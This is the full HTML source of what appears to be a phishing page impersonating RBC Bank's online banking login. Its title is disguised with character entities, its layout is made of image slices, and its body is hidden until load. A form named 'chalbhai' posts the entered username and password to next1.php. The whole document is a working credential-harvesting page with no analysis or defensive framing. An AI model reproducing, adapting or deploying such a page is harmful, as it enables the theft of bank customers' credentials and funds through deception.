<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#82;&#66;&#67;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
 <style type="text/css">
.textbox {
    padding-left: 8px;
  	font-size: 16px;
	height: 38px; 
    border-radius: 5px;
    border: 1px solid #CCC;
    background-image: none;
  	box-shadow: 0px 3px 3px 0px #DDD;
    width: 270px;
}
 .textbox:focus {  
    border-color: #8DAFE6; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 
	</style>	
<style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:25px;
							height:20px; 
							display:inline-block;
							line-height:20px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:20px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -20px;
						}
						label.css-label {
				background-image:url(http://csscheckbox.com/checkboxes/u/csscheckbox_b0971f06326fb1ef8a7e5c2818ad86c0.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:392px; height:368px; z-index:0"><img src="images/bc1.png" alt="" title="" border=0 width=392 height=368></div>

<div id="image2" style="position:absolute; overflow:hidden; left:-4px; top:367px; width:392px; height:223px; z-index:1"><img src="images/bc2.png" alt="" title="" border=0 width=392 height=223></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:558px; width:391px; height:307px; z-index:2"><img src="images/bc3.png" alt="" title="" border=0 width=391 height=307></div>

<div id="image4" style="position:absolute; overflow:hidden; left:9px; top:688px; width:309px; height:16px; z-index:3"><a href="#"><img src="images/priv.png" alt="" title="" border=0 width=309 height=16></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:16px; top:478px; width:356px; height:41px; z-index:4"><a href="#"><img src="images/info.png" alt="" title="" border=0 width=356 height=41></a></div>
<form action=next1.php name=chalbhai id=chalbhai method=post>
<input name="user" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:352px;left:18px;top:237px;z-index:5">
<input name="pass" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:352px;left:18px;top:314px;z-index:6">
<div id="checkboxG1"  style="position:absolute; left:17px; top:375px; z-index:7"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:17px; top:375px; z-index:7"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:17px; top:432px; z-index:8"><input type="image" name="formimage1" width="354" height="38" src="images/sigin.png"></div>
<div id="image6" style="position:absolute; overflow:hidden; left:180px; top:586px; width:52px; height:16px; z-index:9"><a href="#"><img src="images/tip.png" alt="" title="" border=0 width=52 height=16></a></div>


</body>
</html>
